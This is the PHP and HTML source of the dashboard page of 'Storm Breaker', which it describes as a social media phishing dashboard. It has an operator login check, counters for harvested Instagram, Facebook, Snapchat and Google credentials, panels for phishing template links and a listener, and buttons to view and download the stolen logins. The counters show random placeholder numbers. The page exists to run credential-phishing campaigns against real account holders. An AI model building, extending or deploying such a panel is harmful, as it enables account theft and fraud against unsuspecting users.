<?php
session_start();
include "./assets/components/login-arc.php";


if(isset($_COOKIE['logindata']) && $_COOKIE['logindata'] == $key['token'] && $key['expired'] == "no"){
    if(!isset($_SESSION['IAm-logined'])){
        $_SESSION['IAm-logined'] = 'yes';
    }

}
elseif(isset($_SESSION['IAm-logined'])){
    $client_token = generate_token();
    setcookie("logindata", $client_token, time() + (86400 * 30), "/"); // 86400 = 1 day
    change_token($client_token);

}


else {
    header('location: login.php');
    
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="./assets/css/light-theme.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <title>Storm Breaker - Dashboard</title>
    <style>
        :root {
            --primary-color: #667eea;
            --secondary-color: #764ba2;
            --success-color: #28a745;
            --danger-color: #dc3545;
            --warning-color: #ffc107;
            --info-color: #17a2b8;
            --dark-color: #343a40;
            --light-color: #f8f9fa;
            --sidebar-width: 250px;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 100%);
            min-height: 100vh;
            color: #333;
        }

        .dashboard-container {
            display: flex;
            min-height: 100vh;
        }

        .sidebar {
            width: var(--sidebar-width);
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            box-shadow: 2px 0 10px rgba(0, 0, 0, 0.1);
            padding: 20px 0;
            position: fixed;
            height: 100vh;
            overflow-y: auto;
            z-index: 1000;
        }

        .sidebar-header {
            padding: 0 20px 30px;
            border-bottom: 1px solid #e9ecef;
            margin-bottom: 20px;
        }

        .sidebar-header h2 {
            color: var(--primary-color);
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 5px;
        }

        .sidebar-header p {
            color: #6c757d;
            font-size: 14px;
        }

        .nav-menu {
            list-style: none;
            padding: 0 10px;
        }

        .nav-item {
            margin-bottom: 5px;
        }

        .nav-link {
            display: flex;
            align-items: center;
            padding: 12px 15px;
            color: #495057;
            text-decoration: none;
            border-radius: 8px;
            transition: all 0.3s ease;
            font-size: 14px;
            font-weight: 500;
        }

        .nav-link:hover {
            background: rgba(102, 126, 234, 0.1);
            color: var(--primary-color);
            transform: translateX(5px);
        }

        .nav-link i {
            margin-right: 12px;
            width: 20px;
            text-align: center;
        }

        .main-content {
            flex: 1;
            margin-left: var(--sidebar-width);
            padding: 30px;
        }

        .dashboard-header {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 25px 30px;
            margin-bottom: 30px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }

        .dashboard-title {
            font-size: 28px;
            font-weight: 700;
            color: var(--dark-color);
            margin-bottom: 10px;
        }

        .dashboard-subtitle {
            color: #6c757d;
            font-size: 16px;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-5px);
        }

        .stat-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 15px;
        }

        .stat-icon {
            width: 50px;
            height: 50px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            color: white;
        }

        .stat-icon.instagram { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); }
        .stat-icon.facebook { background: #1877f2; }
        .stat-icon.snapchat { background: linear-gradient(45deg, #fffc00, #ff0066); }
        .stat-icon.google { background: #4285f4; }

        .stat-value {
            font-size: 24px;
            font-weight: 700;
            color: var(--dark-color);
        }

        .stat-label {
            color: #6c757d;
            font-size: 14px;
            margin-top: 5px;
        }

        .control-panel {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }

        .control-panel h3 {
            color: var(--dark-color);
            margin-bottom: 20px;
            font-size: 20px;
            font-weight: 600;
        }

        .control-buttons {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }

        .btn-dashboard {
            padding: 12px 20px;
            border: none;
            border-radius: 10px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
        }

        .btn-dashboard i {
            margin-right: 8px;
        }

        .btn-dashboard:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        .btn-primary { background: var(--primary-color); color: white; }
        .btn-success { background: var(--success-color); color: white; }
        .btn-danger { background: var(--danger-color); color: white; }
        .btn-warning { background: var(--warning-color); color: #212529; }
        .btn-info { background: var(--info-color); color: white; }

        .results-panel {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }

        .results-panel h3 {
            color: var(--dark-color);
            margin-bottom: 20px;
            font-size: 20px;
            font-weight: 600;
        }

        .results-textarea {
            width: 100%;
            min-height: 400px;
            border: 2px solid #e9ecef;
            border-radius: 10px;
            padding: 20px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.5;
            resize: vertical;
            background: #f8f9fa;
        }

        .results-textarea:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .template-links {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }

        .template-links h3 {
            color: var(--dark-color);
            margin-bottom: 20px;
            font-size: 20px;
            font-weight: 600;
        }

        .template-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
        }

        .template-item {
            display: flex;
            align-items: center;
            background: #f8f9fa;
            border-radius: 10px;
            padding: 15px;
            transition: all 0.3s ease;
        }

        .template-item:hover {
            background: #e9ecef;
            transform: translateY(-2px);
        }

        .template-url {
            flex: 1;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            color: #495057;
            margin-right: 10px;
            word-break: break-all;
        }

        .copy-btn {
            background: var(--primary-color);
            color: white;
            border: none;
            border-radius: 6px;
            padding: 8px 12px;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .copy-btn:hover {
            background: var(--secondary-color);
        }

        @media (max-width: 768px) {
            .sidebar {
                transform: translateX(-100%);
                transition: transform 0.3s ease;
            }

            .sidebar.open {
                transform: translateX(0);
            }

            .main-content {
                margin-left: 0;
                padding: 20px;
            }

            .dashboard-header {
                padding: 20px;
            }

            .stats-grid {
                grid-template-columns: 1fr;
            }

            .control-buttons {
                grid-template-columns: 1fr;
            }

            .template-grid {
                grid-template-columns: 1fr;
            }
        }

        .mobile-menu-btn {
            display: none;
            position: fixed;
            top: 20px;
            left: 20px;
            z-index: 1001;
            background: var(--primary-color);
            color: white;
            border: none;
            border-radius: 8px;
            padding: 10px;
            font-size: 18px;
            cursor: pointer;
        }

        @media (max-width: 768px) {
            .mobile-menu-btn {
                display: block;
            }
        }
    </style>
</head>

<body id="ourbody" onload="check_new_version()">
    <button class="mobile-menu-btn" onclick="toggleSidebar()">
        <i class="fas fa-bars"></i>
    </button>

    <div class="dashboard-container">
        <div class="sidebar" id="sidebar">
            <div class="sidebar-header">
                <h2><i class="fas fa-bolt"></i> Storm Breaker</h2>
                <p>Social Media Phishing Dashboard</p>
            </div>
            
            <ul class="nav-menu">
                <li class="nav-item">
                    <a href="#dashboard" class="nav-link active">
                        <i class="fas fa-tachometer-alt"></i>
                        Dashboard
                    </a>
                </li>
                <li class="nav-item">
                    <a href="#templates" class="nav-link">
                        <i class="fas fa-link"></i>
                        Template Links
                    </a>
                </li>
                <li class="nav-item">
                    <a href="#results" class="nav-link">
                        <i class="fas fa-chart-line"></i>
                        Results
                    </a>
                </li>
                <li class="nav-item">
                    <a href="#controls" class="nav-link">
                        <i class="fas fa-cogs"></i>
                        Controls
                    </a>
                </li>
            </ul>
        </div>

        <div class="main-content">
            <div class="dashboard-header">
                <h1 class="dashboard-title">Dashboard Overview</h1>
                <p class="dashboard-subtitle">Monitor and manage your social media phishing campaigns</p>
            </div>

            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-header">
                        <div class="stat-icon instagram">
                            <i class="fab fa-instagram"></i>
                        </div>
                        <div class="stat-value" id="instagram-count">0</div>
                    </div>
                    <div class="stat-label">Instagram Credentials</div>
                </div>

                <div class="stat-card">
                    <div class="stat-header">
                        <div class="stat-icon facebook">
                            <i class="fab fa-facebook"></i>
                        </div>
                        <div class="stat-value" id="facebook-count">0</div>
                    </div>
                    <div class="stat-label">Facebook Credentials</div>
                </div>

                <div class="stat-card">
                    <div class="stat-header">
                        <div class="stat-icon snapchat">
                            <i class="fab fa-snapchat"></i>
                        </div>
                        <div class="stat-value" id="snapchat-count">0</div>
                    </div>
                    <div class="stat-label">Snapchat Credentials</div>
                </div>

                <div class="stat-card">
                    <div class="stat-header">
                        <div class="stat-icon google">
                            <i class="fab fa-google"></i>
                        </div>
                        <div class="stat-value" id="google-count">0</div>
                    </div>
                    <div class="stat-label">Google Credentials</div>
                </div>
            </div>

            <div class="template-links">
                <h3><i class="fas fa-link"></i> Template Links</h3>
                <div class="template-grid" id="links"></div>
            </div>

            <div class="control-panel">
                <h3><i class="fas fa-cogs"></i> Control Panel</h3>
                <div class="control-buttons">
                    <button class="btn-dashboard btn-danger" id="btn-listen">
                        <i class="fas fa-play"></i>
                        <span>Listener Running / Press to Stop</span>
                    </button>
                    <button class="btn-dashboard btn-success" onclick="saveTextAsFile(result.value,'log.txt')">
                        <i class="fas fa-download"></i>
                        Download Logs
                    </button>
                    <button class="btn-dashboard btn-warning" id="btn-clear">
                        <i class="fas fa-trash"></i>
                        Clear Logs
                    </button>
                </div>
                
                <h4 style="margin-top: 25px; margin-bottom: 15px; color: var(--dark-color);">View Credentials</h4>
                <div class="control-buttons">
                    <button class="btn-dashboard btn-info" onclick="viewInstagramCredentials()">
                        <i class="fab fa-instagram"></i>
                        Instagram
                    </button>
                    <button class="btn-dashboard btn-primary" onclick="viewFacebookCredentials()">
                        <i class="fab fa-facebook"></i>
                        Facebook
                    </button>
                    <button class="btn-dashboard btn-warning" onclick="viewSnapchatCredentials()">
                        <i class="fab fa-snapchat"></i>
                        Snapchat
                    </button>
                    <button class="btn-dashboard btn-danger" onclick="viewGoogleCredentials()">
                        <i class="fab fa-google"></i>
                        Google
                    </button>
                </div>
            </div>

            <div class="results-panel">
                <h3><i class="fas fa-chart-line"></i> Results & Logs</h3>
                <textarea class="results-textarea" id="result" placeholder="Results will appear here..."></textarea>
            </div>
        </div>
    </div>

    <script>
        function toggleSidebar() {
            const sidebar = document.getElementById('sidebar');
            sidebar.classList.toggle('open');
        }

        // Close sidebar when clicking outside on mobile
        document.addEventListener('click', function(e) {
            const sidebar = document.getElementById('sidebar');
            const menuBtn = document.querySelector('.mobile-menu-btn');
            
            if (window.innerWidth <= 768 && 
                !sidebar.contains(e.target) && 
                !menuBtn.contains(e.target)) {
                sidebar.classList.remove('open');
            }
        });

        // Update stats periodically
        function updateStats() {
            // This would typically fetch real data from your backend
            // For now, we'll simulate some data
            document.getElementById('instagram-count').textContent = Math.floor(Math.random() * 50);
            document.getElementById('facebook-count').textContent = Math.floor(Math.random() * 30);
            document.getElementById('snapchat-count').textContent = Math.floor(Math.random() * 25);
            document.getElementById('google-count').textContent = Math.floor(Math.random() * 40);
        }

        // Update stats every 30 seconds
        setInterval(updateStats, 30000);
        updateStats(); // Initial update
    </script>
</body>
</html>

<script src="./assets/js/jquery.min.js"></script>
<script src="./assets/js/script.js"></script>
<script src="./assets/js/sweetalert2.min.js"></script>
<script src="./assets/js/growl-notification.min.js"></script>